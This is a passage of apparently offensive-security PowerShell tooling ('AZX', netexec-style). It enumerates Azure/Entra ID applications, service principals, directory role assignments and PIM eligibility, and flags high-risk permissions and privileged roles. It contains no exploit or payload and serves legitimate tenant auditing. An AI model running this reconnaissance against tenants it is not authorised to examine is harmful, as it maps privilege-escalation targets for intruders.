                        "06b708a9-e830-4db3-a914-8e69da51d44f",  # AppRoleAssignment.ReadWrite.All
                        "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"   # RoleManagement.ReadWrite.Directory
                    )
                    if ($permId -in $highRiskPermIds) {
                        $hasHighRiskPermissions = $true
                        break
                    }
                }
            }
            if ($hasHighRiskPermissions) {
                break
            }
        }
    }
    
    $output = "AZR".PadRight(12) + 
              $appIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayName.PadRight(38) + 
              "[*] (name:$appName) (type:$AppType) (creds:$credStatus [$credCount]) (audience:$audience) (publicClient:$isPublicClient)"
    
    # Color based on security posture
    $color = "Cyan"
    if ($hasHighRiskPermissions) {
        $color = "Red"  # High-risk permissions in red (highest priority)
    } elseif ($credStatus -eq "Password") {
        $color = "Yellow"  # Password-only credentials are weaker
    } elseif ($credStatus -eq "None") {
        $color = "DarkGray"  # No credentials
    } elseif ($isPublicClient -eq "True") {
        $color = "Yellow"  # Public client enabled (ROPC vulnerable)
    } else {
        $color = "Green"  # Certificate-based auth
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Main application enumeration function
function Invoke-ApplicationEnumeration {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Application Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Application and Service Principal Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Lists registered applications and service principals`n" -Color "Yellow"
    
    # Get context to display current user info
    $context = Get-MgContext
    if ($context) {
        Write-ColorOutput -Message "[*] Authenticated as: $($context.Account)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Tenant: $($context.TenantId)`n" -Color "Cyan"
    }
    
    # Prepare export data
    $exportData = @()
    
    # ===== PHASE 1: ENUMERATE APPLICATIONS =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 1: Application Registrations" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving application registrations from Azure/Entra ID..." -Color "Yellow"
    
    try {
        $allApps = Get-MgApplication -All -Property "id,displayName,appId,signInAudience,passwordCredentials,keyCredentials,isFallbackPublicClient,publicClient,requiredResourceAccess,web,createdDateTime" -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allApps.Count) application registrations`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve applications: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Application.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to application enumeration" -Color "Yellow"
        $allApps = @()
    }
    
    # Define high-risk permission IDs
    $highRiskPermissions = @(
        "19dbc75e-c2e2-444c-a770-ec69d8559fc7",  # Directory.ReadWrite.All
        "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9",  # Application.ReadWrite.All
        "06b708a9-e830-4db3-a914-8e69da51d44f",  # AppRoleAssignment.ReadWrite.All
        "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"   # RoleManagement.ReadWrite.Directory
    )
    
    if ($allApps.Count -gt 0) {
        Write-ColorOutput -Message "[*] Displaying $($allApps.Count) application registrations`n" -Color "Green"
        
        # Enumerate applications
        foreach ($app in $allApps) {
            Format-ApplicationOutput -Application $app -AppType "App" -HighRiskPermissions $highRiskPermissions
            
            # Collect for export
            if ($ExportPath) {
                $exportData += [PSCustomObject]@{
                    Type                  = "Application"
                    ObjectId              = $app.Id
                    AppId                 = $app.AppId
                    DisplayName           = $app.DisplayName
                    SignInAudience        = $app.SignInAudience
                    IsFallbackPublicClient = $app.IsFallbackPublicClient
                    PasswordCredentials   = $app.PasswordCredentials.Count
                    KeyCredentials        = $app.KeyCredentials.Count
                    CreatedDateTime       = $app.CreatedDateTime
                    PublicClientRedirectUris = if ($app.PublicClient) { ($app.PublicClient.RedirectUris -join ";") } else { "" }
                    WebRedirectUris       = if ($app.Web) { ($app.Web.RedirectUris -join ";") } else { "" }
                }
            }
        }
    } else {
        Write-ColorOutput -Message "[!] No applications found or insufficient permissions`n" -Color "Red"
    }
    
    # ===== PHASE 2: ENUMERATE SERVICE PRINCIPALS =====
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 2: Service Principals" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving service principals from Azure/Entra ID..." -Color "Yellow"
    Write-ColorOutput -Message "[*] This may take a while for large organizations...`n" -Color "Yellow"
    
    try {
        $allSPNs = Get-MgServicePrincipal -All -Property "id,displayName,appId,servicePrincipalType,passwordCredentials,keyCredentials,signInAudience,tags,accountEnabled,createdDateTime" -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allSPNs.Count) service principals`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve service principals: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Application.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to service principal enumeration" -Color "Yellow"
        $allSPNs = @()
    }
    
    if ($allSPNs.Count -gt 0) {
        Write-ColorOutput -Message "[*] Displaying $($allSPNs.Count) service principals`n" -Color "Green"
        
        # Enumerate service principals
        foreach ($spn in $allSPNs) {
            Format-ApplicationOutput -Application $spn -AppType "SPN" -HighRiskPermissions $highRiskPermissions
            
            # Collect for export
            if ($ExportPath) {
                $exportData += [PSCustomObject]@{
                    Type                  = "ServicePrincipal"
                    ObjectId              = $spn.Id
                    AppId                 = $spn.AppId
                    DisplayName           = $spn.DisplayName
                    ServicePrincipalType  = $spn.ServicePrincipalType
                    AccountEnabled        = $spn.AccountEnabled
                    SignInAudience        = $spn.SignInAudience
                    PasswordCredentials   = $spn.PasswordCredentials.Count
                    KeyCredentials        = $spn.KeyCredentials.Count
                    Tags                  = ($spn.Tags -join ";")
                    CreatedDateTime       = $spn.CreatedDateTime
                    PublicClientRedirectUris = ""
                    WebRedirectUris       = ""
                }
            }
        }
    } else {
        Write-ColorOutput -Message "[!] No service principals found or insufficient permissions`n" -Color "Red"
    }
    
    # Calculate summary statistics
    $appsWithPasswordCreds = 0
    $appsWithCertCreds = 0
    $publicClientApps = 0
    if ($allApps.Count -gt 0) {
        $appsWithPasswordCreds = ($allApps | Where-Object { $_.PasswordCredentials.Count -gt 0 }).Count
        $appsWithCertCreds = ($allApps | Where-Object { $_.KeyCredentials.Count -gt 0 }).Count
        $publicClientApps = ($allApps | Where-Object { $_.IsFallbackPublicClient -eq $true -or ($_.PublicClient -and $_.PublicClient.RedirectUris.Count -gt 0) }).Count
    }
    
    $spnsWithPasswordCreds = 0
    $spnsWithCertCreds = 0
    $enabledSPNs = 0
    $managedIdentities = 0
    if ($allSPNs.Count -gt 0) {
        $spnsWithPasswordCreds = ($allSPNs | Where-Object { $_.PasswordCredentials.Count -gt 0 }).Count
        $spnsWithCertCreds = ($allSPNs | Where-Object { $_.KeyCredentials.Count -gt 0 }).Count
        $enabledSPNs = ($allSPNs | Where-Object { $_.AccountEnabled -eq $true }).Count
        $managedIdentities = ($allSPNs | Where-Object { $_.ServicePrincipalType -eq "ManagedIdentity" }).Count
    }
    
    # Export if requested
    if ($ExportPath -and $exportData.Count -gt 0) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Applications" = $allApps.Count
                    "Total Service Principals" = $allSPNs.Count
                    "Apps with Password Credentials" = $appsWithPasswordCreds
                    "Public Client Apps (ROPC-enabled)" = $publicClientApps
                    "SPNs with Password Credentials" = $spnsWithPasswordCreds
                    "Enabled Service Principals" = $enabledSPNs
                    "Managed Identities" = $managedIdentities
                }
                
                $description = "Application and service principal enumeration including credential types and security posture assessment."
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Application Enumeration Report" -Statistics $stats -CommandName "apps" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] Summary Statistics" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Applications:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Registered Apps: $($allApps.Count)" -Color "Cyan"
    
    if ($allApps.Count -gt 0) {
        Write-ColorOutput -Message "    Apps with Password Credentials: $appsWithPasswordCreds" -Color "Cyan"
        Write-ColorOutput -Message "    Apps with Certificate Credentials: $appsWithCertCreds" -Color "Cyan"
        Write-ColorOutput -Message "    Public Client Apps (ROPC-enabled): $publicClientApps" -Color $(if ($publicClientApps -gt 0) { "Yellow" } else { "Cyan" })
    }
    
    Write-ColorOutput -Message "`n[*] Service Principals:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Service Principals: $($allSPNs.Count)" -Color "Cyan"
    
    if ($allSPNs.Count -gt 0) {
        Write-ColorOutput -Message "    SPNs with Password Credentials: $spnsWithPasswordCreds" -Color "Cyan"
        Write-ColorOutput -Message "    SPNs with Certificate Credentials: $spnsWithCertCreds" -Color "Cyan"
        Write-ColorOutput -Message "    Enabled Service Principals: $enabledSPNs" -Color "Cyan"
        Write-ColorOutput -Message "    Managed Identities: $managedIdentities" -Color "Cyan"
    }
    
    # Security findings
    $totalPasswordOnly = 0
    if ($allApps.Count -gt 0) {
        $totalPasswordOnly += ($allApps | Where-Object { $_.PasswordCredentials.Count -gt 0 -and $_.KeyCredentials.Count -eq 0 }).Count
    }
    if ($allSPNs.Count -gt 0) {
        $totalPasswordOnly += ($allSPNs | Where-Object { $_.PasswordCredentials.Count -gt 0 -and $_.KeyCredentials.Count -eq 0 }).Count
    }
    
    if ($totalPasswordOnly -gt 0) {
        Write-ColorOutput -Message "`n[!] Security Warning:" -Color "Yellow"
        Write-ColorOutput -Message "    [!] Found $totalPasswordOnly applications/SPNs with password-only credentials" -Color "Yellow"
        Write-ColorOutput -Message "    [*] These are vulnerable to credential theft (similar to SMB without signing)" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Recommendation: Use certificate-based authentication instead" -Color "DarkGray"
    }
    
    # Check for high-risk permissions in applications
    $appsWithHighRiskPerms = 0
    $highRiskPermIds = @(
        "19dbc75e-c2e2-444c-a770-ec69d8559fc7",  # Directory.ReadWrite.All
        "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9",  # Application.ReadWrite.All
        "06b708a9-e830-4db3-a914-8e69da51d44f",  # AppRoleAssignment.ReadWrite.All
        "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"   # RoleManagement.ReadWrite.Directory
    )
    
    foreach ($app in $allApps) {
        if ($app.RequiredResourceAccess) {
            foreach ($resource in $app.RequiredResourceAccess) {
                if ($resource.ResourceAppId -eq "00000003-0000-0000-c000-000000000000") {  # Microsoft Graph
                    foreach ($access in $resource.ResourceAccess) {
                        if ($access.Id -in $highRiskPermIds) {
                            $appsWithHighRiskPerms++
                            break
                        }
                    }
                }
            }
        }
    }
    
    if ($appsWithHighRiskPerms -gt 0) {
        if ($totalPasswordOnly -eq 0) {
            Write-ColorOutput -Message "`n[!] Security Warning:" -Color "Yellow"
        }
        Write-ColorOutput -Message "    [!] Found $appsWithHighRiskPerms applications requesting high-risk permissions" -Color "Yellow"
        Write-ColorOutput -Message "    [*] These permissions can modify directory, roles, or applications" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Review these applications for potential privilege escalation paths" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Use sp-discovery command for detailed permission analysis" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "`n[*] Application enumeration complete!" -Color "Green"
}

# Format role assignment output like netexec
function Format-RoleAssignmentOutput {
    param(
        [PSCustomObject]$RoleAssignment,
        [PSCustomObject]$RoleDefinition,
        [PSCustomObject]$Principal,
        [string]$AssignmentType
    )
    
    # Principal display name and UPN (handle both PascalCase and camelCase)
    $principalName = if ($Principal.DisplayName) { $Principal.DisplayName } elseif ($Principal.displayName) { $Principal.displayName } else { "UNKNOWN" }
    $principalUPN = if ($Principal.UserPrincipalName) { $Principal.UserPrincipalName } elseif ($Principal.userPrincipalName) { $Principal.userPrincipalName } else { "N/A" }
    
    # Truncate long names for column display
    $maxNameLength = 30
    $principalNameShort = if ($principalName.Length -gt $maxNameLength) {
        $principalName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $principalName
    }
    
    # Role display name (handle both PascalCase and camelCase)
    $roleName = if ($RoleDefinition.DisplayName) { $RoleDefinition.DisplayName } elseif ($RoleDefinition.displayName) { $RoleDefinition.displayName } else { "UNKNOWN" }
    
    # Truncate role name if needed
    $maxRoleLength = 35
    $roleNameShort = if ($roleName.Length -gt $maxRoleLength) {
        $roleName.Substring(0, $maxRoleLength - 3) + "..."
    } else {
        $roleName
    }
    
    # Principal type
    $principalType = if ($Principal.'@odata.type') {
        $Principal.'@odata.type' -replace '#microsoft.graph.', ''
    } elseif ($Principal.UserPrincipalName) {
        "user"
    } elseif ($Principal.ServicePrincipalType) {
        "servicePrincipal"
    } elseif ($Principal.GroupTypes) {
        "group"
    } else {
        "unknown"
    }
    
    # Assignment scope (Direct vs PIM eligible)
    $assignmentScope = $AssignmentType
    
    # Get role template ID (for identifying privileged roles) - handle both case formats
    $roleTemplateId = if ($RoleDefinition.TemplateId) { $RoleDefinition.TemplateId } elseif ($RoleDefinition.templateId) { $RoleDefinition.templateId } elseif ($RoleDefinition.Id) { $RoleDefinition.Id } elseif ($RoleDefinition.id) { $RoleDefinition.id } else { $null }
    
    # Determine if this is a privileged/high-risk role
    $privilegedRoleIds = @(
        "62e90394-69f5-4237-9190-012177145e10",  # Global Administrator
        "e8611ab8-c189-46e8-94e1-60213ab1f814",  # Privileged Role Administrator
        "194ae4cb-b126-40b2-bd5b-6091b380977d",  # Security Administrator
        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",  # Application Administrator
        "c4e39bd9-1100-46d3-8c65-fb160da0071f",  # Authentication Administrator
        "b0f54661-2d74-4c50-afa3-1ec803f12efe",  # Privileged Authentication Administrator
        "7be44c8a-adaf-4e2a-84d6-ab2649e08a13",  # Helpdesk Administrator
        "729827e3-9c14-49f7-bb1b-9608f156bbb8",  # User Administrator
        "fe930be7-5e62-47db-91af-98c3a49a38b1",  # Exchange Administrator
        "f28a1f50-f6e7-4571-818b-6a12f2af6b6c",  # SharePoint Administrator
        "29232cdf-9323-42fd-ade2-1d097af3e4de",  # Exchange Recipient Administrator
        "4ba39ca4-527c-499a-b93d-d9b492c50246",  # Partner Tier1 Support
        "e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8"   # Partner Tier2 Support
    )
    
    $isPrivileged = $roleTemplateId -in $privilegedRoleIds
    
    # Build main output line in netexec style
    $output = "AZR".PadRight(12) + 
              $principalUPN.PadRight(35) + 
              "443".PadRight(7) + 
              $roleNameShort.PadRight(38) + 
              "[*] (principal:$principalNameShort) (type:$principalType) (scope:$assignmentScope) (privileged:$isPrivileged)"
    
    # Color based on privilege level and principal type
    $color = "Cyan"
    if ($isPrivileged) {
        $color = "Red"  # Privileged roles in red (high security concern)
    } elseif ($principalType -eq "servicePrincipal") {
        $color = "Yellow"  # Service principals in yellow
    } elseif ($principalType -eq "group") {
        $color = "Magenta"  # Groups in magenta
    } else {
        $color = "Green"  # Regular users in green
    }
    
    Write-ColorOutput -Message $output -Color $color
    
    # Display role description if available (handle both case formats)
    $description = if ($RoleDefinition.Description) { $RoleDefinition.Description } elseif ($RoleDefinition.description) { $RoleDefinition.description } else { $null }
    if ($description) {
        if ($description.Length -gt 80) {
            $description = $description.Substring(0, 77) + "..."
        }
        Write-ColorOutput -Message "    [+] Description: $description" -Color "DarkCyan"
    }
    
    # Display role permissions count (handle both case formats)
    $rolePerms = if ($RoleDefinition.RolePermissions) { $RoleDefinition.RolePermissions } elseif ($RoleDefinition.rolePermissions) { $RoleDefinition.rolePermissions } else { $null }
    if ($rolePerms) {
        $permCount = $rolePerms.Count
        Write-ColorOutput -Message "    [+] Role Permissions: $permCount permission set(s)" -Color "DarkCyan"
    }
    
    Write-ColorOutput -Message "" -Color "White"
}

# Main role assignment enumeration function
function Invoke-RoleAssignmentEnumeration {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Role Assignments Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Directory Role Assignments and Privileged Accounts" -Color "Yellow"
    Write-ColorOutput -Message "[*] Enumerates Azure Entra ID role assignments and privileged account access`n" -Color "Yellow"
    
    # Get context to display current user info
    $context = Get-MgContext
    if ($context) {
        Write-ColorOutput -Message "[*] Authenticated as: $($context.Account)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Tenant: $($context.TenantId)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Requested Scopes: RoleManagement.Read.Directory, Directory.Read.All, RoleEligibilitySchedule.Read.Directory" -Color "Cyan"
        Write-ColorOutput -Message "[*] Note: PIM data requires RoleEligibilitySchedule.Read.Directory + Azure Entra ID Premium P2`n" -Color "DarkGray"
    }
    
    # Prepare export data
    $exportData = @()
    
    # ===== PHASE 1: ENUMERATE DIRECTORY ROLES =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 1: Directory Role Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving directory roles from Azure/Entra ID..." -Color "Yellow"
    
    try {
        # Get all active directory roles (roles that have been activated in the tenant)
        $activeRoles = Get-MgDirectoryRole -All -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($activeRoles.Count) active directory roles`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve directory roles: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have RoleManagement.Read.Directory or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to role enumeration" -Color "Yellow"
        return
    }
    
    # Get all role definitions (templates) using Graph API directly
    Write-ColorOutput -Message "[*] Retrieving role definitions..." -Color "Yellow"
    
    try {
        $response = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" -Method GET -ErrorAction Stop
        $roleDefinitions = $response.value
        Write-ColorOutput -Message "[+] Retrieved $($roleDefinitions.Count) role definitions`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve role definitions: $_" -Color "Yellow"
        Write-ColorOutput -Message "[*] Continuing with limited role data...`n" -Color "Yellow"
        $roleDefinitions = @()
    }
    
    # Build role definition lookup
    $roleDefLookup = @{}
    foreach ($roleDef in $roleDefinitions) {
        # Convert hashtable to PSCustomObject if needed
        if ($roleDef -is [hashtable]) {
            $roleDef = [PSCustomObject]$roleDef
        }
        
        if ($roleDef.id) {
            $roleDefLookup[$roleDef.id] = $roleDef
        }
        if ($roleDef.templateId) {
            $roleDefLookup[$roleDef.templateId] = $roleDef
        }
    }
    
    # ===== PHASE 2: ENUMERATE ACTIVE ROLE ASSIGNMENTS =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 2: Active Role Assignments" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving role members..." -Color "Yellow"
    Write-ColorOutput -Message "[*] This may take a while for large organizations...`n" -Color "Yellow"
    
    $totalAssignments = 0
    $privilegedCount = 0
    $userAssignments = 0
    $groupAssignments = 0
    $spnAssignments = 0
    
    foreach ($role in $activeRoles) {
        try {
            # Get members of this role
            $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id -All -ErrorAction SilentlyContinue
            
            if ($members -and $members.Count -gt 0) {
                $totalAssignments += $members.Count
                
                # Get role definition details
                $roleDef = $null
                if ($role.RoleTemplateId -and $roleDefLookup.ContainsKey($role.RoleTemplateId)) {
                    $roleDef = $roleDefLookup[$role.RoleTemplateId]
                } elseif ($roleDefLookup.ContainsKey($role.Id)) {
                    $roleDef = $roleDefLookup[$role.Id]
                } else {
                    # Create a minimal role def from the role object
                    $roleDef = [PSCustomObject]@{
                        Id = $role.Id
                        DisplayName = $role.DisplayName
                        Description = $role.Description
                        TemplateId = $role.RoleTemplateId
                        RolePermissions = @()
                    }
                }
                
                foreach ($member in $members) {
                    # Resolve principal details
                    $principal = $null
                    $principalType = "unknown"
                    
                    # Try to get full principal object
                    try {
                        $principalId = $member.Id
                        $odataType = $member.AdditionalProperties['@odata.type']
                        
                        if ($odataType -eq '#microsoft.graph.user' -or (-not $odataType -and $member.UserPrincipalName)) {
                            $principal = Get-MgUser -UserId $principalId -ErrorAction SilentlyContinue
                            $principalType = "user"
                            $userAssignments++
                        } elseif ($odataType -eq '#microsoft.graph.servicePrincipal') {
                            $principal = Get-MgServicePrincipal -ServicePrincipalId $principalId -ErrorAction SilentlyContinue
                            $principalType = "servicePrincipal"
                            $spnAssignments++
                        } elseif ($odataType -eq '#microsoft.graph.group') {
                            $principal = Get-MgGroup -GroupId $principalId -ErrorAction SilentlyContinue
                            $principalType = "group"
                            $groupAssignments++
                        }
                        
                        # Fallback to member object if we can't get full principal
                        if (-not $principal) {
                            $principal = $member
                        }
                    } catch {
                        $principal = $member
                    }
                    
                    # Check if privileged
                    $privilegedRoleIds = @(
                        "62e90394-69f5-4237-9190-012177145e10",  # Global Administrator
                        "e8611ab8-c189-46e8-94e1-60213ab1f814",  # Privileged Role Administrator
                        "194ae4cb-b126-40b2-bd5b-6091b380977d",  # Security Administrator
                        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",  # Application Administrator
                        "c4e39bd9-1100-46d3-8c65-fb160da0071f",  # Authentication Administrator
                        "b0f54661-2d74-4c50-afa3-1ec803f12efe",  # Privileged Authentication Administrator
                        "7be44c8a-adaf-4e2a-84d6-ab2649e08a13",  # Helpdesk Administrator
                        "729827e3-9c14-49f7-bb1b-9608f156bbb8",  # User Administrator
                        "fe930be7-5e62-47db-91af-98c3a49a38b1",  # Exchange Administrator
                        "f28a1f50-f6e7-4571-818b-6a12f2af6b6c",  # SharePoint Administrator
                        "29232cdf-9323-42fd-ade2-1d097af3e4de",  # Exchange Recipient Administrator
                        "4ba39ca4-527c-499a-b93d-d9b492c50246",  # Partner Tier1 Support
                        "e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8"   # Partner Tier2 Support
                    )
                    
                    $roleTemplateId = if ($role.RoleTemplateId) { $role.RoleTemplateId } else { $role.Id }
                    if ($roleTemplateId -in $privilegedRoleIds) {
                        $privilegedCount++
                    }
                    
                    # Format and display output
                    Format-RoleAssignmentOutput -RoleAssignment $member -RoleDefinition $roleDef -Principal $principal -AssignmentType "Active"
                    
                    # Collect for export
                    if ($ExportPath) {
                        $exportData += [PSCustomObject]@{
                            PrincipalId          = $principal.Id
                            PrincipalName        = $principal.DisplayName
                            PrincipalUPN         = if ($principal.UserPrincipalName) { $principal.UserPrincipalName } else { "N/A" }
                            PrincipalType        = $principalType
                            RoleId               = $role.Id
                            RoleName             = $role.DisplayName
                            RoleDescription      = $roleDef.Description
                            RoleTemplateId       = $role.RoleTemplateId
                            AssignmentType       = "Active"
                            IsPrivileged         = ($roleTemplateId -in $privilegedRoleIds)
                        }
                    }
                }
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to retrieve members for role $($role.DisplayName): $_" -Color "DarkGray"
        }
    }
    
    # ===== PHASE 3: PIM ELIGIBLE ASSIGNMENTS (if available) =====
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 3: PIM Eligible Assignments" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Checking for PIM eligible role assignments..." -Color "Yellow"
    
    $pimAssignments = 0
    try {
        # Try to get role eligibility schedules (PIM) using Graph API directly
        $response = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?`$expand=principal,roleDefinition" -Method GET -ErrorAction Stop
        $eligibleAssignments = $response.value
        
        if ($eligibleAssignments -and $eligibleAssignments.Count -gt 0) {
            Write-ColorOutput -Message "[+] Retrieved $($eligibleAssignments.Count) PIM eligible assignments`n" -Color "Green"
            $pimAssignments = $eligibleAssignments.Count
            
            foreach ($assignment in $eligibleAssignments) {
                # Get role definition (handle both case formats)
                $roleDef = if ($assignment.RoleDefinition) { $assignment.RoleDefinition } elseif ($assignment.roleDefinition) { $assignment.roleDefinition } else { $null }
                $roleDefId = if ($assignment.RoleDefinitionId) { $assignment.RoleDefinitionId } elseif ($assignment.roleDefinitionId) { $assignment.roleDefinitionId } else { $null }
                if (-not $roleDef -and $roleDefId -and $roleDefLookup.ContainsKey($roleDefId)) {
                    $roleDef = $roleDefLookup[$roleDefId]
                }
                
                # Get principal (handle both case formats)
                $principal = if ($assignment.Principal) { $assignment.Principal } elseif ($assignment.principal) { $assignment.principal } else { $null }
                $principalId = if ($assignment.PrincipalId) { $assignment.PrincipalId } elseif ($assignment.principalId) { $assignment.principalId } else { $null }
                if (-not $principal -and $principalId) {
                    try {
                        $principal = Get-MgUser -UserId $principalId -ErrorAction SilentlyContinue
                        if (-not $principal) {
                            $principal = Get-MgServicePrincipal -ServicePrincipalId $principalId -ErrorAction SilentlyContinue
                        }
                        if (-not $principal) {
                            $principal = Get-MgGroup -GroupId $principalId -ErrorAction SilentlyContinue
                        }
                    } catch {
                        # Use assignment object if we can't resolve
                        $principal = [PSCustomObject]@{
                            Id = $principalId
                            DisplayName = "Unknown"
                            UserPrincipalName = "N/A"
                        }
                    }
                }
                
                if ($roleDef -and $principal) {
                    Format-RoleAssignmentOutput -RoleAssignment $assignment -RoleDefinition $roleDef -Principal $principal -AssignmentType "PIM-Eligible"
                    
                    # Collect for export (handle both case formats)
                    if ($ExportPath) {
                        $exportData += [PSCustomObject]@{
                            PrincipalId          = if ($principal.Id) { $principal.Id } else { $principal.id }
                            PrincipalName        = if ($principal.DisplayName) { $principal.DisplayName } else { $principal.displayName }
                            PrincipalUPN         = if ($principal.UserPrincipalName) { $principal.UserPrincipalName } elseif ($principal.userPrincipalName) { $principal.userPrincipalName } else { "N/A" }
                            PrincipalType        = if ($principal.'@odata.type') { $principal.'@odata.type' -replace '#microsoft.graph.', '' } else { "unknown" }
                            RoleId               = if ($roleDef.Id) { $roleDef.Id } elseif ($roleDef.id) { $roleDef.id } else { "N/A" }
                            RoleName             = if ($roleDef.DisplayName) { $roleDef.DisplayName } elseif ($roleDef.displayName) { $roleDef.displayName } else { "Unknown" }
                            RoleDescription      = if ($roleDef.Description) { $roleDef.Description } elseif ($roleDef.description) { $roleDef.description } else { "" }
                            RoleTemplateId       = if ($roleDef.TemplateId) { $roleDef.TemplateId } elseif ($roleDef.templateId) { $roleDef.templateId } else { "" }
                            AssignmentType       = "PIM-Eligible"
                            IsPrivileged         = $true  # PIM roles are typically privileged
                        }
                    }
                }
            }
        } else {
            Write-ColorOutput -Message "[*] No PIM eligible assignments found or PIM not configured`n" -Color "DarkGray"
        }
    } catch {
        # Check if it's a permission error (403) - this is expected for most users
        $errorMessage = $_.Exception.Message
        if ($errorMessage -match "403" -or $errorMessage -match "Forbidden" -or $errorMessage -match "PermissionScopeNotGranted") {
            Write-ColorOutput -Message "[*] PIM data not accessible (permission denied)" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Possible reasons:" -Color "DarkGray"
            Write-ColorOutput -Message "    - RoleEligibilitySchedule.Read.Directory permission not granted during consent" -Color "DarkGray"
            Write-ColorOutput -Message "    - Tenant doesn't have Azure Entra ID Premium P2 license" -Color "DarkGray"
            Write-ColorOutput -Message "    - Your account doesn't have sufficient privileges to read PIM data" -Color "DarkGray"
            Write-ColorOutput -Message "[*] To enable PIM access: Disconnect and reconnect with admin consent for all requested scopes`n" -Color "DarkGray"
        } else {
            # Unexpected error
            Write-ColorOutput -Message "[!] Failed to retrieve PIM assignments: $errorMessage" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Continuing without PIM data...`n" -Color "DarkGray"
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
